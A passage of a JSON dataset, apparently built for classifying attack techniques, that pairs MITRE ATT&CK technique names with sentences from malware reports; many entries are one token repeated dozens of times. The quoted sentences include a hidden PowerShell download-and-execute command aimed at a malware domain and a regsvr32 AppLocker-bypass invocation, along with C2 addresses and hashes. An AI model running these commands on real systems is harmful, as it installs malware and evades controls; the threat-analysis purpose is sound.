        "The r1.log file stores information for exfiltration",
        "After Comnie has been copied to the %TEMP% directory, it will look for the presence of the \u2018DQuit.tmp\u2019 file in this path",
        "FeedBack.php validates the sender by User-Agent, saves the data in the \u201cRAR\u201d server directory and stores the metadata in the mssql database for later reference",
        "Log.php validates the sender by User-Agent, saves the data in the \u201cUP\u201d server directory and stores the metadata in the mssql database for later reference"
    ],
    "rundll32": [
        "Note: aswrundll.exe is very similar to Microsoft\u2019s own rundll32.exe - it allows you to execute DLLs by calling their exported functions",
        "On the next step this file is executed by rundll32.exe via the KlpSvc export",
        "The dropper installs 2 files:netwf.bat : executes netwf.dllnetwf.dll : the payloadThe dropper implements 2 persistence mechanisms:HKCU\\Environment\\UserInitMprLogonScript to execute the netwf.bat fileCOM Object hijack of the following CLSID: {BCDE0395-E52F-467C-8E3D-C4579291692E}, the CLSID of the class MMDeviceEnumerator.These 2 techniques have also been previously used by this actor.Finally the payload is executed by rundll32.exe (and the ordinal #1 in argument) or by explorer.exe if the COM Object hijack is performed",
        "The loader component is executed via RUNDLL32.EXE",
        "Then it checks to see if it was launched by RUNDLL32.exe along with parameter #1",
        "If this function is successfully loaded, it will ultimately spawn a new instance of itself with the Rundll32Call export via a call to rundll32.exe",
        "If the string is present, the malware executes the command RunDll32.exe",
        "rundll32.exe",
        "rundll32.exe",
        "rundll32.exe",
        "rundll32.exe",
        "rundll32.exe",
        "rundll32.exe",
        "rundll32.exe",
        "rundll32.exe",
        "rundll32.exe",
        "rundll32.exe",
        "rundll32.exe",
        "rundll32.exe",
        "rundll32.exe",
        "rundll32.exe",
        "rundll32.exe",
        "rundll32.exe",
        "rundll32.exe",
        "rundll32.exe",
        "rundll32.exe",
        "rundll32.exe",
        "rundll32.exe",
        "rundll32.exe",
        "rundll32.exe",
        "rundll32.exe",
        "rundll32.exe",
        "rundll32.exe",
        "rundll32.exe",
        "rundll32.exe",
        "rundll32.exe",
        "rundll32.exe",
        "rundll32.exe",
        "rundll32.exe",
        "rundll32.exe",
        "rundll32.exe",
        "rundll32.exe",
        "rundll32.exe",
        "rundll32.exe",
        "rundll32.exe",
        "rundll32.exe",
        "rundll32.exe",
        "rundll32.exe",
        "rundll32.exe",
        "rundll32.exe",
        "rundll32.exe",
        "rundll32.exe",
        "rundll32.exe",
        "rundll32.exe",
        "rundll32.exe",
        "rundll32.exe",
        "rundll32.exe"
    ],
    "regsvr32": [
        "It loads the module with parameter vShow set to zero, which opens the application with a hidden window.\u00a0 Alternatively, if Avast is not installed on the machine, the malicious module loads using regsvr32.exe",
        "regsvr32.exe is a native Windows utility for registering and unregistering DLLs and ActiveX controls in the Windows registry.\u00a0  \u00a0The script attempts to load the malicious module using regsvr with the run function.\u00a0  Procmon shows the malicious module loaded to the Avast process",
        "The malicious modules in regsvr32.exe memory After the Irdsnhrxxxfery98 module is loaded, the malware searches different processes to continue its malicious activity depending on the way Irdsnhrxxxfery64 was loaded",
        "If Irdsnhrxxxfery64 is loaded using regsvr32.exe, it will target three processes:   It will target unins000.exe if it is available",
        "The Cybereason platform was able to detect the malicious injection, identifying Irdsnhrxxxfery64.~, Irdsnhrxxxfery98.~, and module arqueiro.\u00a0  The downloaded modules found in regsvr32.exe as detected by the Cybereason platform",
        "The function then uses the built-in Shell function to run the following command, which effectively executes the .sct file stored in 12-B-366.txt:       regsvr32.exe /s /n /u /i:%TEMP%\\12-B-366.txt scrobj.dll     The use of the legitimate regsvr32.exe application to run a .sct file is an AppLocker bypass technique originally discovered by Casey Smith (@subtee), which eventually resulted in a Metasploit module",
        "After selecting a payload URL, the script will create copies of certutil and regsvr32 to the temp directory for later use",
        "8 Making a copy of certutil and regsvr32 Certutil.exe (a copy is renamed to certis.exe by the trojan) is normally used in a windows environment to manage certificates, but in this case, it is used by the second stylesheet to download the malware payloads",
        "11 AV detection If there is no Avast install present, the script proceeds to the final .dll execution using regsvr32 and quits",
        "19-1 regsvr32 running the .dlls  Fig",
        "regsvr32.exe",
        "regsvr32.exe",
        "regsvr32.exe",
        "regsvr32.exe",
        "regsvr32.exe",
        "regsvr32.exe",
        "regsvr32.exe",
        "regsvr32.exe",
        "regsvr32.exe",
        "regsvr32.exe",
        "regsvr32.exe",
        "regsvr32.exe",
        "regsvr32.exe",
        "regsvr32.exe",
        "regsvr32.exe",
        "regsvr32.exe",
        "regsvr32.exe",
        "regsvr32.exe",
        "regsvr32.exe",
        "regsvr32.exe",
        "regsvr32.exe",
        "regsvr32.exe",
        "regsvr32.exe",
        "regsvr32.exe",
        "regsvr32.exe",
        "regsvr32.exe",
        "regsvr32.exe",
        "regsvr32.exe",
        "regsvr32.exe",
        "regsvr32.exe",
        "regsvr32.exe",
        "regsvr32.exe",
        "regsvr32.exe",
        "regsvr32.exe",
        "regsvr32.exe",
        "regsvr32.exe",
        "regsvr32.exe",
        "regsvr32.exe",
        "regsvr32.exe",
        "regsvr32.exe",
        "regsvr32.exe",
        "regsvr32.exe",
        "regsvr32.exe",
        "regsvr32.exe",
        "regsvr32.exe",
        "regsvr32.exe",
        "regsvr32.exe",
        "regsvr32.exe",
        "regsvr32.exe",
        "regsvr32.exe"
    ],
    "regsvr32 software packing-multi": {
        "technique_names": [
            "regsvr32",
            "software packing"
        ],
        "sentances": [
            "Procmon shows the malicious module loaded using the regsvr32.exe process.\u00a0\u00a0 Phase two: Payload Analysis\u00a0 \u00a0 The only module the XSL script loads is Irdsnhrxxxfery64, which is packed using the UPX packer"
        ]
    },
    "software packing": [
        "After unpacking the module, it is packed with an additional inner packer Pe123\\RPolyCryptor",
        "BlackEnergy2 was eventually seen downloading more crimeware plugins \u2013 a custom spam plugin and a banking information stealer custom plugin",
        "It should be noted that in most of these cases the backdoor was embedded as a packed payload in another executable or in a weaponized document file of some kind",
        "Flash object in the .docx file, stored in uncompressed format The Flash object contains an ActionScript which is responsible for extracting the exploit using a custom packer seen in other FinSpy exploits",
        "The PCODE of the virtual machine is packed with the aplib packer",
        "An interesting note on these payloads is that all the Delphi payloads delivered in this campaign were packed with UPX, while none of the other payloads were packed",
        "While we can only speculate on the specific reason, it is likely Sofacy packed only the Delphi variants in an attempt to increase evasion as the Delphi variant of Zebrocy is known and has been widely analyzed",
        "The MSIL file contains the packed core payload in its .Net resource section",
        "Obfuscation While the downloader module is not packed, the backdoor is packed with a modified version of UPX",
        "Two modifications are made to UPX version 3.91:  The magic bytes UPX! in the UPX header are replaced with ASS7, The decompressed code and strings sections are XORed with 0x01",
        "Figure 6: Difference between a stock UPX packed file and the modified one A patch for UPX is available on ESET\u2019s malware-research Github repository that allows unpacking Keydnap\u2019s backdoor with the usual upx -d",
        "See the following for more information and examples of false flags being used in cyberattacks: Wave your false flags! \u2026or the Nightmares and Nuances of a Self-Aware Attribution Space OlympicDestroyer is here to trick the industry Malware description The malware was first seen packed with VMProtect; when unpacked the sample didn\u2019t show any similarities with previously known malware",
        "Can be packed into a single .py file and run without any dependencies other than the python standard library on all OSes",
        "(Source: Dell SecureWorks) In SWCs analyzed by CTU researchers, the threat actors added the Dean Edwards packed JavaScript code shown in Figure 9 to the end of a legitimate website's menu page",
        "First, the sample is UPX packed"
    ],
    "system information discovery system network configuration discovery account discovery-multi": {
        "technique_names": [
            "system information discovery",
            "system network configuration discovery",
            "account discovery"
        ],
        "sentances": [
            "It executes the other modules and collects initial information about the machine, including information about the network, locale, and the keyboard language.\u00a0  \u00a0The main module collecting information about the machine"
        ]
    },
    "process injection regsvr32-multi": {
        "technique_names": [
            "process injection",
            "regsvr32"
        ],
        "sentances": [
            "Continuing Malicious Activity and Manipulating Additional Security Products After the module loads with regsvr32.exe, the Irdsnhrxxxfery64 module injects another module Irdsnhrxxxfery98, which was downloaded by the script into regsvr32.exe using the LoadLibraryExW() function",
            "Similar to the previous case, if Avast and aswrundll.exe are on the machine, Irdsnhrxxxfery98 will be injected into that process instead of regsvr32.exe.\u00a0  Irdsnhrxxxfery64 injecting lrdsnhrxxfery98"
        ]
    },
    "process hollowing process discovery-multi": {
        "technique_names": [
            "process hollowing",
            "process discovery"
        ],
        "sentances": [
            "Irdsnhrxxxfery64 manipulation on userinit.exe & unins000.exe Injection Technique To Increase Stealthiness After locating one of the target processes, the malware uses Process Hollowing (MITRE Technique T1093) to evasively create a new process from a legitimate source",
            "The macro downloads a payload from hxxp://lokipanelhostingpanel[.]gq/work/kh/1.exe (SHA256: 84ed59953f57f5927b9843f35ca3c325155d5210824d3b79b060755827b51f72) by running the following command line process:cmd.exe /c powershell -W Hidden (New-Object System.NeT.WeBClieNT).DownloadFile('http://lokipanelhostingpanel[.]gq/work/kh/1.exe','%Public%\\\\\\\\svchost32.exe');Start-Process '%Public%\\\\\\\\svchost32.exeThe macro then attempts to kill Microsoft Office and Windows Defender processes using the \u2018taskkill\u2019 command"
        ]
    },
    "clipboard data": [
        "Data Exfiltration The second module Irdsnhrxxxfery98.~ is responsible for a vast amount of information stealing, and is able to collect information through hooking, clipboard usage, and monitoring the keystate",
        "Cadelspy\u2019s main payload contains its back door functionality, allowing the threat to carry out the following activities:  Log keystrokes and the titles of open windows Gather clipboard data and system information Steal printer information and any documents that were sent to be printed Record audio Capture screenshots and webcam photos  Cadelspy compresses all of the stolen data into a .cab file and uploads it to the attacker\u2019s C&C servers",
        "Clipboard stealer ",
        "Clipboard stealer ",
        "Clipboard stealer ",
        "Clipboard stealer ",
        "Clipboard stealer ",
        "Clipboard stealer ",
        "Clipboard stealer ",
        "Clipboard stealer ",
        "Clipboard stealer ",
        "Clipboard stealer ",
        "Clipboard stealer ",
        "Clipboard stealer ",
        "Clipboard stealer ",
        "Clipboard stealer ",
        "Clipboard stealer ",
        "Clipboard stealer ",
        "Clipboard stealer ",
        "Clipboard stealer ",
        "Clipboard stealer ",
        "Clipboard stealer ",
        "Clipboard stealer ",
        "Clipboard stealer ",
        "Clipboard stealer ",
        "Clipboard stealer ",
        "Clipboard stealer ",
        "Clipboard stealer ",
        "Clipboard stealer ",
        "Clipboard stealer ",
        "Clipboard stealer ",
        "Clipboard stealer ",
        "Clipboard stealer ",
        "Clipboard stealer ",
        "Clipboard stealer ",
        "Clipboard stealer ",
        "Clipboard stealer ",
        "Clipboard stealer ",
        "Clipboard stealer ",
        "Clipboard stealer ",
        "Clipboard stealer ",
        "Clipboard stealer ",
        "Clipboard stealer ",
        "Clipboard stealer ",
        "Clipboard stealer ",
        "Clipboard stealer ",
        "Clipboard stealer ",
        "Clipboard stealer ",
        "Clipboard stealer ",
        "Clipboard stealer ",
        "Clipboard stealer ",
        "Clipboard stealer ",
        "OpenClipboard()  ",
        "OpenClipboard()  ",
        "OpenClipboard()  ",
        "OpenClipboard()  ",
        "OpenClipboard()  ",
        "OpenClipboard()  ",
        "OpenClipboard()  ",
        "OpenClipboard()  ",
        "OpenClipboard()  ",
        "OpenClipboard()  ",
        "OpenClipboard()  ",
        "OpenClipboard()  ",
        "OpenClipboard()  ",
        "OpenClipboard()  ",
        "OpenClipboard()  ",
        "OpenClipboard()  ",
        "OpenClipboard()  ",
        "OpenClipboard()  ",
        "OpenClipboard()  ",
        "OpenClipboard()  ",
        "OpenClipboard()  ",
        "OpenClipboard()  ",
        "OpenClipboard()  ",
        "OpenClipboard()  ",
        "OpenClipboard()  ",
        "OpenClipboard()  ",
        "OpenClipboard()  ",
        "OpenClipboard()  ",
        "OpenClipboard()  ",
        "OpenClipboard()  ",
        "OpenClipboard()  ",
        "OpenClipboard()  ",
        "OpenClipboard()  ",
        "OpenClipboard()  ",
        "OpenClipboard()  ",
        "OpenClipboard()  ",
        "OpenClipboard()  ",
        "OpenClipboard()  ",
        "OpenClipboard()  ",
        "OpenClipboard()  ",
        "OpenClipboard()  ",
        "OpenClipboard()  ",
        "OpenClipboard()  ",
        "OpenClipboard()  ",
        "OpenClipboard()  ",
        "OpenClipboard()  ",
        "OpenClipboard()  ",
        "OpenClipboard()  ",
        "OpenClipboard()  ",
        "OpenClipboard()  ",
        " GetClipboardData() ",
        " GetClipboardData() ",
        " GetClipboardData() ",
        " GetClipboardData() ",
        " GetClipboardData() ",
        " GetClipboardData() ",
        " GetClipboardData() ",
        " GetClipboardData() ",
        " GetClipboardData() ",
        " GetClipboardData() ",
        " GetClipboardData() ",
        " GetClipboardData() ",
        " GetClipboardData() ",
        " GetClipboardData() ",
        " GetClipboardData() ",
        " GetClipboardData() ",
        " GetClipboardData() ",
        " GetClipboardData() ",
        " GetClipboardData() ",
        " GetClipboardData() ",
        " GetClipboardData() ",
        " GetClipboardData() ",
        " GetClipboardData() ",
        " GetClipboardData() ",
        " GetClipboardData() ",
        " GetClipboardData() ",
        " GetClipboardData() ",
        " GetClipboardData() ",
        " GetClipboardData() ",
        " GetClipboardData() ",
        " GetClipboardData() ",
        " GetClipboardData() ",
        " GetClipboardData() ",
        " GetClipboardData() ",
        " GetClipboardData() ",
        " GetClipboardData() ",
        " GetClipboardData() ",
        " GetClipboardData() ",
        " GetClipboardData() ",
        " GetClipboardData() ",
        " GetClipboardData() ",
        " GetClipboardData() ",
        " GetClipboardData() ",
        " GetClipboardData() ",
        " GetClipboardData() ",
        " GetClipboardData() ",
        " GetClipboardData() ",
        " GetClipboardData() ",
        " GetClipboardData() ",
        " GetClipboardData() ",
        " pbpaste ",
        " pbpaste ",
        " pbpaste ",
        " pbpaste ",
        " pbpaste ",
        " pbpaste ",
        " pbpaste ",
        " pbpaste ",
        " pbpaste ",
        " pbpaste ",
        " pbpaste ",
        " pbpaste ",
        " pbpaste ",
        " pbpaste ",
        " pbpaste ",
        " pbpaste ",
        " pbpaste ",
        " pbpaste ",
        " pbpaste ",
        " pbpaste ",
        " pbpaste ",
        " pbpaste ",
        " pbpaste ",
        " pbpaste ",
        " pbpaste ",
        " pbpaste ",
        " pbpaste ",
        " pbpaste ",
        " pbpaste ",
        " pbpaste ",
        " pbpaste ",
        " pbpaste ",
        " pbpaste ",
        " pbpaste ",
        " pbpaste ",
        " pbpaste ",
        " pbpaste ",
        " pbpaste ",
        " pbpaste ",
        " pbpaste ",
        " pbpaste ",
        " pbpaste ",
        " pbpaste ",
        " pbpaste ",
        " pbpaste ",
        " pbpaste ",
        " pbpaste ",
        " pbpaste ",
        " pbpaste ",
        " pbpaste ",
        " OnDrawClipboard",
        " OnDrawClipboard",
        " OnDrawClipboard",
        " OnDrawClipboard",
        " OnDrawClipboard",
        " OnDrawClipboard",
        " OnDrawClipboard",
        " OnDrawClipboard",
        " OnDrawClipboard",
        " OnDrawClipboard",
        " OnDrawClipboard",
        " OnDrawClipboard",
        " OnDrawClipboard",
        " OnDrawClipboard",
        " OnDrawClipboard",
        " OnDrawClipboard",
        " OnDrawClipboard",
        " OnDrawClipboard",
        " OnDrawClipboard",
        " OnDrawClipboard",
        " OnDrawClipboard",
        " OnDrawClipboard",
        " OnDrawClipboard",
        " OnDrawClipboard",
        " OnDrawClipboard",
        " OnDrawClipboard",
        " OnDrawClipboard",
        " OnDrawClipboard",
        " OnDrawClipboard",
        " OnDrawClipboard",
        " OnDrawClipboard",
        " OnDrawClipboard",
        " OnDrawClipboard",
        " OnDrawClipboard",
        " OnDrawClipboard",
        " OnDrawClipboard",
        " OnDrawClipboard",
        " OnDrawClipboard",
        " OnDrawClipboard",
        " OnDrawClipboard",
        " OnDrawClipboard",
        " OnDrawClipboard",
        " OnDrawClipboard",
        " OnDrawClipboard",
        " OnDrawClipboard",
        " OnDrawClipboard",
        " OnDrawClipboard",
        " OnDrawClipboard",
        " OnDrawClipboard",
        " OnDrawClipboard"
    ],
    "process injection process discovery-multi": {
        "technique_names": [
            "process injection",
            "process discovery"
        ],
        "sentances": [
            "Attack Flow and Exfiltration After injecting into the targeted processes, the modules continue their malicious activity through those processes",
            "Analyzing Gold Dragon As part of its initialization, Gold Dragon:  Builds its imports by dynamically loading multiple APIs from multiple libraries Gains debug privileges (\u201cSeDebugPrivilege\u201d) for its own process to read remote memory residing in other processes  The malware does not establish persistence for itself but for another component (if it is found) on the system:  The malware begins by looking for an instance of the Hangul word processor (HWP) running on the system",
            "By using this method, it will copy itself into a running Internet Explorer process in order to avoid detection by running as an independent process"
        ]
    },
    "standard application layer protocol custom cryptographic protocol standard cryptographic protocol binary padding web service exfiltration over command and control channel pass the hash uncommonly used port fallback channels-multi": {
        "technique_names": [
            "standard application layer protocol",
            "custom cryptographic protocol",
            "standard cryptographic protocol",
            "binary padding",
            "web service",
            "exfiltration over command and control channel",
            "pass the hash",
            "uncommonly used port",
            "fallback channels",
            "commonly used port"
        ],
        "sentances": [
            "For more information on LOLbins in the wild,\u00a0read\u00a0our research into a different Trojan.\u00a0 LOLbins and Trojans: How the Ramnit Trojan Spreads via sLoad in a Cyberattack Indicators of CompromisE     SHA1 01782747C12Bf06A52704A144DB59FEC41B3CB36   Hash   NF-e513468.zip     SHA1 1F83403398964D4E8B6C70B171C51CD278909172   Hash   Script.js     SHA1 CE8BDB56CCAC55C6881701EBD39DA316EE7ED18D   Hash   lrdsnhrxxfery64.~     SHA1 926137A50f473BBD257CD19E207C1C9114F6B215   Hash   lrdsnhrxxfery98.~     SHA1 5579E03EB1DA076EF939196CB14F8B769F30A302   Hash   lrdsnhrxxferyb.jpg     SHA1 B2734835888756929EE3FF4DCDE85080CB299D2A   Hash   lrdsnhrxxferyc.jpg     SHA1 206352E13D601239E2D043D971EA6657C091071A   Hash   lrdsnhrxxferydwwn.gif     SHA1 EAE82A63A980998F8D388BCCE7D967F28309F593   Hash   lrdsnhrxxferydwwn.gif     SHA1 9CD5A399C9320CBFB87C9D1CAD3BC366FB12E54F   Hash   lrdsnhrxxferydx.gif     SHA1 206352E13D601239E2D043D971EA6657C091071A   Hash   lrdsnhrxxferye.jpg     SHA1 4CDE9A53A9A49D606BC89E74D47398A69E767056   Hash   lrdsnhrxxferyg.gif     SHA1 F99319B1B321AE9F2D1F0361BC756A43D25444CE   Hash   lrdsnhrxxferygx.gif     SHA1 B85C106B68ED410107f97A2CC38b7EC05353F1FA   Hash   lrdsnhrxxferyxa.~     SHA1 77809236FDF621ABE37B32BF073B0B893E9CE67A   Hash   lrdsnhrxxferyxb.~     SHA1 B85C106B68ED410107f97A2CC38b7EC05353F1fA   Hash   lrdsnhrxxferyxa.~     SHA1 C2F3350AC58DE900768032554C009C4A78C47CCC   Hash   r1.log     104.129.204[.]41   IP   C2     63.251.126[.]7   IP   C2     195.157.15[.]100   IP   C2     173.231.184[.]59   IP   C2     64.95.103[.]181   IP   C2     19analiticsx00220a[.]com   Domain   C2     qnccmvbrh.wilstonbrwsaq[.]pw   Domain   C2"
        ]
    },
    "network service scanning": [
        "Those assignments were not likely arbitrary, as this group had developed BlackEnergy2 for several years in a professional and organized style:  Config with a similar set of plugins for different architectures Here is the list of retrieved files and related functionality:    weap DDoS Attack (various types)   ps password stealer handling a variety of network protocols (SMTP, POP3, IMAP, HTTP, FTP, Telnet)   nm scans ports, stores banners   snif logs IP source and destination, TCP/UDP ports   hook main module: CnC communication, config parser, plugins loader   uper rewrites hook module with a new version and launches it     Weap, Snif, Nm plugin grammar mistakes and mis-spellings The developers\u2019 coding style differed across the \u2018Hook\u2019 main module, the plugins, and the Windows main.dll",
        "Scan the network environment of the infected machine; checks for availability of specific ports on servers that share the same internal and external subnet mask (i.e 255.255.0.0\\16)",
        "Mimikatz The threat actors also uploaded tools to scan for and exploit potential vulnerabilities in the network, such as the well-known SMB vulnerability patched in commonly exploited by EternalBlue to move laterally to other systems on the network."
    ],
    "execution through api file deletion remote file copy-multi": {
        "technique_names": [
            "execution through api",
            "file deletion",
            "remote file copy"
        ],
        "sentances": [
            "Hook module structure After decrypting the strings, it became clear that the Linux Hook main module communicated with the same CnC server as other Windows modules:  The CNC\u2019s IP address in the Linux module This Linux module can process the following commands, some of which are similar to the Windows version:    die  delete all BlackEnergy2 files and system traces   kill  delete all BlackEnergy2 files and system traces and reboot   lexec  launch a command using bin/sh   rexec  download and launch file using \u2018fork/exec\u2019   update  rewrite self file   migrate  update the CnC server    Windows Plugins After the disclosure of an unusual CnC server that pushed Linux and the new Windows plugins we paid greater\u00a0attention to new BE2 samples and associated CnCs"
        ]
    },
    "system service discovery file and directory discovery-multi": {
        "technique_names": [
            "system service discovery",
            "file and directory discovery",
            "tor"
        ],
        "sentances": [
            "Russia Ukraine Poland Lithuania Belarus Azerbaijan Kyrgyzstan Kazakhstan Iran Israel Turkey Libya Kuwait Taiwan Vietnam India Croatia Germany Belgium Sweden  Victim profiles point to an expansive interest in ICS:  power generation site owners power facilities construction power generation operators large suppliers and manufacturers of heavy power related materials investors  However, we also noticed that\u00a0the target list includes government, property holding, and technology organizations as well:  high level government other ICS construction federal land holding agencies municipal offices federal emergency services space and earth measurement and assessment labs national standards body banks high-tech\u00a0transportation academic research  Victim cases We gained insight into significant BE2 victim profiles over the summer of 2014"
        ]
    },
    "data from local system file deletion connection proxy data staged remote file copy-multi": {
        "technique_names": [
            "data from local system",
            "file deletion",
            "connection proxy",
            "data staged",
            "remote file copy"
        ],
        "sentances": [
            "The config files within BE2 contained the settings of the company\u2019s internal web proxy:  BE2 config file contains victim\u2019s internal proxy As the APT-specific BE2 now stores the downloaded plugins in encrypted files on the system (not seen in older versions \u2013 all plugins were only in-memory), the administrators were able to collect BE2 files from the infected machines"
        ]
    },
    "system service discovery masquerading data staged-multi": {
        "technique_names": [
            "system service discovery",
            "masquerading",
            "data staged"
        ],
        "sentances": [
            "They are consistent and\u00a0serve as stable\u00a0IoC: %system32%driverswinntd_.dat %system32%driverswinntd.dat %system32%driverswincache.dat %system32%driversmlang.dat %system32%driversosver32nt.dat %LOCALAPPDATA%adobewind002.dat %LOCALAPPDATA%adobesettings.sol %LOCALAPPDATA%adobewinver.dat %LOCALAPPDATA%adobecache.dat BE2 also uses start menu locations for persistence: UsersuserAppDataRoamingMicrosoftWindowsStart MenuProgramsStartupflashplayerapp.exe BE3 uses the following known filenames: %USERPROFILE%NTUSER.LOG %LOCALAPPDATA%FONTCACHE.DAT BE2 MD5s: d57ccbb25882b16198a0f43285dafbb4 7740a9e5e3feecd3b7274f929d37bccf 948cd0bf83a670c05401c8b67d2eb310 f2be8c6c62be8f459d4bb7c2eb9b9d5e 26a10fa32d0d7216c8946c8d83dd3787 8c51ba91d26dd34cf7a223eaa38bfb03 c69bfd68107ced6e08fa22f72761a869 3cd7b0d0d256d8ff8c962f1155d7ab64 298b9a6b1093e037e65da31f9ac1a807 d009c50875879bd2aefab3fa1e20be09 88b3f0ef8c80a333c7f68d9b45472b88 17b00de1c61d887b7625642bad9af954 27eddda79c79ab226b9b24005e2e9b6c 48937e732d0d11e99c68895ac8578374 82418d99339bf9ff69875a649238ac18 f9dcb0638c8c2f979233b29348d18447 72372ffac0ee73dc8b6d237878e119c1 c229a7d86a9e9a970d18c33e560f3dfc ef618bd99411f11d0aa5b67d1173ccdf 383c07e3957fd39c3d0557c6df615a1a 105586891deb04ac08d57083bf218f93 1deea42a0543ce1beeeeeef1ffb801e5 7d1e1ec1b1b0a82bd0029e8391b0b530 1f751bf5039f771006b41bdc24bfadd3 d10734a4b3682a773e5b6739b86d9b88 632bba51133284f9efe91ce126eda12d a22e08e643ef76648bec55ced182d2fe 04565d1a290d61474510dd728f9b5aae 3c1bc5680bf93094c3ffa913c12e528b 6a03d22a958d3d774ac5437e04361552 0217eb80de0e649f199a657aebba73aa 79cec7edf058af6e6455db5b06ccbc6e f8453697521766d2423469b53a233ca7 8a449de07bd54912d85e7da22474d3a9 3f9dc60445eceb4d5420bb09b9e03fbf 8f459ae20291f2721244465aa6a6f7b9 4b323d4320efa67315a76be2d77a0c83 035848a0e6ad6ee65a25be3483af86f2 90d8e7a92284789d2e15ded22d34ccc3 edb324467f6d36c7f49def27af5953a5 c1e7368eda5aa7b09e6812569ebd4242 ec99e82ad8dbf1532b0a5b32c592efdf 391b9434379308e242749761f9edda8e 6bf76626037d187f47a54e97c173bc66 895f7469e50e9bb83cbb36614782a33e 1feacbef9d6e9f763590370c53cd6a30 82234c358d921a97d3d3a9e27e1c9825 558d0a7232c75e29eaa4c1df8a55f56b e565255a113b1af8df5adec568a161f3 1821351d67a3dce1045be09e88461fe9 b1fe41542ff2fcb3aa05ff3c3c6d7d13 53c5520febbe89c25977d9f45137a114 4513e3e8b5506df268881b132ffdcde1 19ce80e963a5bcb4057ef4f1dd1d4a89 9b29903a67dfd6fec33f50e34874b68b b637f8b5f39170e7e5ada940141ddb58 c09683d23d8a900a848c04bab66310f1 6d4c2cd95a2b27777539beee307625a2 e32d5c22e90cf96296870798f9ef3d15 64c3ecfd104c0d5b478244fe670809cc b69f09eee3da15e1f8d8e8f76d3a892a 294f9e8686a6ab92fb654060c4412edf 6135bd02103fd3bab05c2d2edf87e80a b973daa1510b6d8e4adea3fb7af05870 8dce09a2b2b25fcf2400cffb044e56b8 6008f85d63f690bb1bfc678e4dc05f97 1bf8434e6f6e201f10849f1a4a9a12a4 6cac1a8ba79f327d0ad3f4cc5a839aa1 462860910526904ef8334ee17acbbbe5 eeec7c4a99fdfb0ef99be9007f069ba8 6bbc54fb91a1d1df51d2af379c3b1102 8b152fc5885cb4629f802543993f32a1 6d1187f554040a072982ab4e6b329d14 3bfe642e752263a1e2fe22cbb243de57 c629933d129c5290403e9fce8d713797 1c62b3d0eb64b1511e0151aa6edce484 811fcbadd31bccf4268653f9668c1540 0a89949a3a933f944d0ce4c0a0c57735 a0f594802fbeb5851ba40095f7d3dbd1 bf6ce6d90535022fb6c95ac9dafcb5a5 df84ff928709401c8ad44f322ec91392 fda6f18cf72e479570e8205b0103a0d3 39835e790f8d9421d0a6279398bb76dc fe6295c647e40f8481a16a14c1dfb222 592c5fbf99565374e9c20cade9ac38aa ad8dc222a258d11de8798702e52366aa bc21639bf4d12e9b01c0d762a3ffb15e 3122353bdd756626f2dc95ed3254f8bf e02d19f07f61d73fb6dd5f7d06e9f8d2 d2c7bf274edb2045bc5662e559a33942 ac1a265be63be7122b94c63aabcc9a66 e06c27e3a436537a9028fdafc426f58e 6cf2302e129911079a316cf73a4d010f 38b6ad30940ddfe684dad7a10aea1d82 f190cda937984779b87169f35e459c3a 698a41c92226f8e444f9ca7647c8068c bc95b3d795a0c28ea4f57eafcab8b5bb 82127dc2513694a151cbe1a296258850 d387a5e232ed08966381eb2515caa8e1 f4b9eb3ddcab6fd5d88d188bc682d21d 8e42fd3f9d5aac43d69ca740feb38f97 a43e8ddecfa8f3c603162a30406d5365 ea7dd992062d2f22166c1fca1a4981a1 7bf6dcf413fe71af2d102934686a816b cf064356b31f765e87c6109a63bdbf43 4a46e2dc16ceaba768b5ad3cdcb7e097 2134721de03a70c13f2b10cfe6018f36 7add5fd0d84713f609679840460c0464 cc9402e5ddc34b5f5302179c48429a56 9803e49d9e1c121346d5b22f3945bda8 c5f5837bdf486e5cc2621cc985e65019 2b72fda4b499903253281ebbca961775 7031f6097df04f003457c9c7ecbcda1c 6a6c2691fef091c1fc2e1c25d7c3c44c 9bd3fa59f30df5d54a2df385eba710a5 5100eb13cac2fc3dec2d00c5d1d3921c 0a2c2f5cf97c65f6473bdfc90113d81e 30b74abc22a5b75d356e3a57e2c84180 a0424e8436cbc44107119f62c8e7491b c1ba892d254edd8a580a16aea6f197e9 e70976785efcfaeed20aefab5c2eda60 397b5d66bac2eb5e950d2a4f9a5e5f2c 4e9bde9b6abf7992f92598be4b6d1781 54d266dee2139dd82b826a9988f35426 5b4faa2846e91e811829a594fecfe493 907448af4388072cdc01e69b7b97b174 ccad214045af69d06768499a0bd3d556 1395dfda817818c450327ab331d51c1b 715e9e60be5a9b32075189cb04a0247e 3835c8168d66104eed16c2cd99952045 f32c29a620d72ec0a435982d7a69f683 95e9162456d933fff9560bee3c270c4e da01ef50673f419cf06b106546d06b50 2dd4c551eacce0aaffedf4e00e0d03de 34f80f228f8509a67970f6062075e211 81ca7526881a0a41b6721048d2f20874 d642c73d0577dd087a02069d46f68dac BE3 MD5s: f0ebb6105c0981fdd15888122355398c 7cb6363699c5fd683187e24b35dd303e 4d5c00bddc8ea6bfa9604b078d686d45 f37b67705d238a7c2dfcdd7ae3c6dfaa 46649163c659cba8a7d0d4075329efa3 628ef31852e91895d601290ce44650b1 723eb7a18f4699c892bc21bba27a6a1a 8b9f4eade3a0a650af628b1b26205ba3 f6c47fcc66ed7c3022605748cb5d66c6 6c1996c00448ec3a809b86357355d8f9 faab06832712f6d877baacfe1f96fe15 2c72ef155c77b306184fa940a2de3844 2e62e8949d123722ec9998d245bc1966 b0dc4c3402e7999d733fa2b668371ade 93fa40bd637868a271002a17e6dbd93b f98abf80598fd89dada12c6db48e3051 8a7c30a7a105bd62ee71214d268865e3 2f6582797bbc34e4df47ac25e363571d 81d127dd7957e172feb88843fe2f8dc1 3e25544414030c961c196cea36ed899d Previous and Parallel Research Botnet History Illustrated by BlackEnergy 2, PH Days, Kaspersky Lab \u2013 Maria Garnaeva and Sergey Lozhkin, May 2014 BlackEnergy and Quedagh (pdf), F-Secure, September 2014 Sandworm, iSIGHT Partners, October 2014 Alert (ICS-ALERT-14-281-01A)\u00a0Ongoing Sophisticated Malware Campaign Compromising ICS (Update A), ICS-CERT, October 2014"
        ]
    },
    "standard application layer protocol connection proxy exfiltration over command and control channel data encoding data encrypted-multi": {
        "technique_names": [
            "standard application layer protocol",
            "connection proxy",
            "exfiltration over command and control channel",
            "data encoding",
            "data encrypted"
        ],
        "sentances": [
